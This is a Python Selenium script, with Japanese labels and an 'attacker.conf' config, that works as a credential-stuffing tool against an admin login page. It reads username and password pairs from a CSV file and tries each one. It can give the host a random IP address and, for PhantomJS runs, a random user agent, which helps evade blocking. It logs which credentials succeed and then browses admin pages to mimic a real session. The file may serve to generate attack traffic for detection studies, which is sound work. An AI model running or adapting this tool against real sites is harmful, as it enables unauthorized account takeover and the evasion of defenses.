# -*- coding: utf-8 -*-

import configparser
import csv
import datetime
import locale
import logging
import os
import random
import re
import subprocess
from logging import DEBUG, StreamHandler, getLogger
from time import sleep

import ipaddr
from selenium import webdriver
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities

from fake_useragent import UserAgent

logger = getLogger(__name__)
handler = StreamHandler()
handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s', datefmt='%Y/%m/%d %I:%M:%S'))
handler.setLevel(DEBUG)
logger.setLevel(DEBUG)
logger.addHandler(handler)
logger.propagate = False
ua = UserAgent()

conf_senario_access_arr = (
    "ユーザー",
    "内容",
    "ページ",
    "ブログ投稿",
    "コメント",
    "メディアライブラリ",
    "サイト",
    "リダイレクト",
    "設定",
    "グループ"
)


def path(file_name):
    return os.path.normpath(os.path.join(os.path.abspath('__file__'), '../{}'.format(file_name)))


def gen_rondomip():
    network = ipaddr.IPv4Network('100.0.0.0/16')
    return ipaddr.IPv4Address(random.randrange(int(network.network) + 1, int(network.broadcast) - 1))


def change_ipaddr(ip_addr):
    cmd_list = (
        "ip addr flush dev ens192",
        "ip addr add {}/4 dev ens192".format(ip_addr),
        "ip link set ens192 up",
        "route add -net 160.17.0.0 gw 111.255.255.254 netmask 255.255.0.0 dev ens192"
    )
    for cmd in cmd_list:
        try:
            proc = subprocess.Popen(cmd, shell=True)
            proc.wait()
        except Exception as e:
            logger.debug(e)


def interval(config):
    max_ = int(config.get('interval', 'max'))
    min_ = int(config.get('interval', 'min'))
    if max_ == min_:
        sleep(min_)
    else:
        sleep(random.uniform(min_, max_))


def crawler(config, user_id, passwd):
    try:
        if config.get('general', 'driver'):
            driver_type = config.get('general', 'driver')
        else:
            driver_type = "chrome"

        if driver_type == "chrome":
            driver = webdriver.Chrome(path('driver/chromedriver'), desired_capabilities=DesiredCapabilities.CHROME)
        elif driver_type == "phantomjs":
            dcap = {
                "phantomjs.page.settings.userAgent": ua.random,
                'marionette': True
            }
            #driver = webdriver.PhantomJS(path(executable_path='driver/phantomjs-2.1.1-macosx/bin/phantomjs'), desired_capabilities=dcap)
            driver = webdriver.PhantomJS(executable_path=path('driver/phantomjs'), desired_capabilities=dcap)

        if config.get('general', 'ip_type'):
            if config.get('general', 'ip_type') == "random":
                change_ipaddr(gen_rondomip())

        driver.implicitly_wait(30)
        driver.set_page_load_timeout(30)

        driver.get(config.get('general', 'url'))
        interval(config)

        user = driver.find_element_by_xpath('//*[@id="id_username"]')
        user.send_keys(user_id)

        pass_ = driver.find_element_by_xpath('//*[@id="id_password"]')
        pass_.send_keys(passwd)

        driver.find_element_by_xpath('//*[@id="login-form"]/div[2]/input').click()

        if "ダッシュボード" in driver.page_source:
            result = "Succeeded"
        else:
            result = "Failed"
        logger.debug("User: {}, Pass: {}, Result: {}".format(user_id, passwd, result))
        interval(config)

        if result == "Succeeded":
            logout = False
            senario_label = ""

            if config.get('senario', 'pattern'):
                pattern = config.get('senario', 'pattern')
            else:
                pattern = "X"

            if pattern in ["1", "2"]:
                senario_label = "ログイン -> 特定1URLにアクセス"
                target_senario_access_arr = conf_senario_access_arr[0]
            elif pattern in ["3", "4"]:
                senario_label = "ログイン -> 特定4URLにアクセス"
                target_senario_access_arr = conf_senario_access_arr[0:4]
            elif pattern in ["5", "6"]:
                senario_label = "ログイン -> ランダムな1URLにアクセス"
                target_senario_access_arr = conf_senario_access_arr[int(random.uniform(0, len(conf_senario_access_arr)) - 1)]
            elif pattern in ["7", "8"]:
                senario_label = "ログイン -> ランダムな4URLにアクセス"
                target_senario_access_arr = []
                for num in range(4):
                    target_senario_access_arr.append(conf_senario_access_arr[int(random.uniform(0, len(conf_senario_access_arr)) - 1)])
            elif pattern in ["9", "0"]:
                senario_label = "ランダムな1～5URLにアクセス"
                target_senario_access_arr = []
                for num in range(int(random.uniform(1, 6))):
                    target_senario_access_arr.append(conf_senario_access_arr[int(random.uniform(0, len(conf_senario_access_arr)) - 1)])
            else:
                senario_label = "シナリオ無"
                target_senario_access_arr = []

            if re.match("[13579]", pattern):
                logout = True

            logger.debug("------------------------------------------------")
            logger.debug("Senario-{} : {}".format(pattern, senario_label))
            logger.debug("Run senario")

            if isinstance(target_senario_access_arr, str):
                logger.debug("Clicked: {}".format(target_senario_access_arr))
                driver.find_element_by_xpath('//a[text()="{}"]'.format(target_senario_access_arr)).click()
                interval(config)
            else:
                for senario in target_senario_access_arr:
                    logger.debug("Clicked: {}".format(senario))
                    driver.find_element_by_xpath('//a[text()="{}"]'.format(senario)).click()
                    interval(config)

            if logout:
                logger.debug("Logout")
                driver.find_element_by_xpath('//a[@href="/ja/admin/logout/"]').click()
            else:
                logger.debug("Doesn't logout")

            logger.debug("----------------")
            interval(config)

    except Exception as e:
        logger.debug(e)

    finally:
        driver.close()


def main():
    config = configparser.SafeConfigParser()
    config.read(path('attacker.conf'))
    if config.get('general', 'account') == "username":
        account = 0
    elif config.get('general', 'account') == "email":
        account = 1
    else:
        logger.debug("Warn: don't exsit setting and so, set username account")
        account = 0

    if config.get('general', 'loop'):
        loop_flag = config.get('general', 'loop')
    else:
        loop_flag = False

    while loop_flag:
        with open(path('account_list.csv')) as f:
            reader = csv.reader(f)
            for row in reader:
                crawler(config, row[account], row[2])


if __name__ == '__main__':
    main()
